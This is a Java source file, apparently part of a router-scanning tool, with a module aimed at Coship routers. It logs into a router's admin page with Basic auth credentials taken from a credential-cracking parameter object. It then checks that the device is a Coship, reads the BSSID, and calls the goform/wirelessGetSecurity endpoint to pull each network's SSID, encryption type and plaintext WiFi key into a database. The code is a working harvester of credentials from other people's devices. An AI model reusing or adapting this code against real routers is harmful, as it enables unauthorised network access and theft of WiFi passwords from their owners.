/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package org.koreops.tauro.cli.scraper.basicauth;

import com.gargoylesoftware.htmlunit.ElementNotFoundException;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.nodes.Element;
import org.jsoup.select.Elements;
import org.koreops.net.def.beans.AuthCrackParams;
import org.koreops.tauro.cli.dao.UpdaterDao;
import org.koreops.tauro.cli.scraper.AbstractScrapperAndSaver;
import org.koreops.tauro.core.loggers.Logger;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Scraper module for Coship Routers.
 *
 * @author Sudipto Sarkar (k0r0pt) (sudiptosarkar@visioplanet.org).
 */
public class CoshipScraper extends AbstractScrapperAndSaver {

  public CoshipScraper(String host, String hostUrl, AuthCrackParams params, UpdaterDao updaterDao) {
    super(host, hostUrl, params, updaterDao);
  }

  @Override
  public boolean scrapeAndLog() {
    return this.logCoshipStation();
  }

  private boolean logCoshipStation() {
    try {

      Document doc = Jsoup.connect(hostUrl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Logger.debug(host + ": Title: " + doc.title());

      if (!(coshipTitles.contains(doc.title()))) {
        Logger.debug(host + ": Not a COSHIP router.");
        return false;
      }

      System.out.println("Found COSHIP");

      String uurl = hostUrl + "wireless/basic.asp";

      doc = Jsoup.connect(uurl).userAgent(USER_AGENT).header("Authorization", "Basic " + base64Login).timeout(60000).get();

      Elements elements = doc.select("table tbody tr");

      String macAddr = null;

      for (Element element : elements) {
        if (element.select("td#basicBSSID") != null) {
          if (!"".equals(element.select("td#basicBSSID + td").text().trim())) {
            macAddr = element.select("td#basicBSSID + td").text().trim().toLowerCase();
            macAddr = macAddr.replace(" ", "");
            macAddr = macAddr.replace("-", ":");
            System.out.println("\n\n\n\n\n\n\n\n\n\n\n" + macAddr);
            Logger.info(host + ": Found MAC: " + macAddr);
            break;
          }
        }
      }

      if (macAddr == null) {
        Logger.error(host + ": Wifi not available.", true);
        return false;
      }

      List<Map<String, String>> wifiDataList = this.fetchDetails(macAddr);

      for (Map<String, String> m : wifiDataList) {
        updaterDao.saveStation(m, host);
      }
      return true;
    } catch (IOException ex) {
      Logger.error(host + ": IOException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (FailingHttpStatusCodeException ex) {
      Logger.error(host + ": FailingHttpStatusCodeException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (ElementNotFoundException ex) {
      Logger.error(host + ": ElementNotFoundException during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    } catch (Exception ex) {
      Logger.error(host + ": Exception during getWirelessData(): " + ex.getMessage() + " ::::::: " + ex.toString());
    }

    return false;
  }

  private List<Map<String, String>> fetchDetails(String bssid) throws IOException {
    String url = hostUrl + "goform/wirelessGetSecurity";
    HttpClient httpClient = new DefaultHttpClient();
    HttpPost post = new HttpPost(url);

    //add reuqest header
    post.setHeader("User-Agent", USER_AGENT);
    post.setHeader("Content-type", "UTF-8");
    post.setHeader("Authorization", "Basic " + base64Login);

    List<NameValuePair> urlParameters = new ArrayList<>();
    urlParameters.add(new BasicNameValuePair("n/a", ""));
    // Send post request

    post.setEntity(new UrlEncodedFormEntity(urlParameters));
    System.out.println("\nSending 'POST' request to URL : " + url);
    //System.out.println("Post parameters : " + post.getEntity());
    HttpResponse response = httpClient.execute(post);

    System.out.println("Response Code : " + response.getStatusLine().getStatusCode());

    System.out.println(response.getEntity().getContentLength() + " bytes received.");
    System.out.println(response.getEntity().isChunked() + " chunked.");
    System.out.println(response.getEntity().isStreaming() + " streaming.");
    System.out.println(response.getEntity().getContentType());
    System.out.println(response.getEntity().getContentEncoding());

    int in;
    StringBuilder result = new StringBuilder();
    BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));

    while ((in = rd.read()) != -1) {
      result.append((char) in);
      System.out.println(in);
    }

    System.out.println(result.toString());
    String str = result.toString();

    String[] allStr = str.split("\n");

    List<Map<String, String>> wifiDataList = new ArrayList<>();

    for (int i = 0; i < allStr.length - 1; i++) {
      Map<String, String> wifiData = new HashMap<>();
      String[] fields_str = allStr[i + 1].split("\r");

      wifiData.put("BSSID", bssid);
      wifiData.put("SSID", fields_str[0]);
      wifiData.put("AuthType", fields_str[2]);
      wifiData.put("Encryption", fields_str[3]);
      wifiData.put("key", fields_str[13]);

      wifiDataList.add(wifiData);
    }

    List<Map<String, String>> remove = new ArrayList<>();

    for (Map<String, String> m : wifiDataList) {
      Logger.info(host + ": Found SSID: " + m.get("SSID"));

      Logger.info(host + ": Found AuthType: " + m.get("AuthType"));
      Logger.info(host + ": Found Encryption: " + m.get("Encryption"));

      if (m.get("key") == null) {
        remove.add(m);
        Logger.error("Non-WPA found. Code for this shit!");
      }
      Logger.info(host + ": Found key: " + m.get("key"));
    }

    wifiDataList.removeAll(remove);

    return wifiDataList;
  }
}
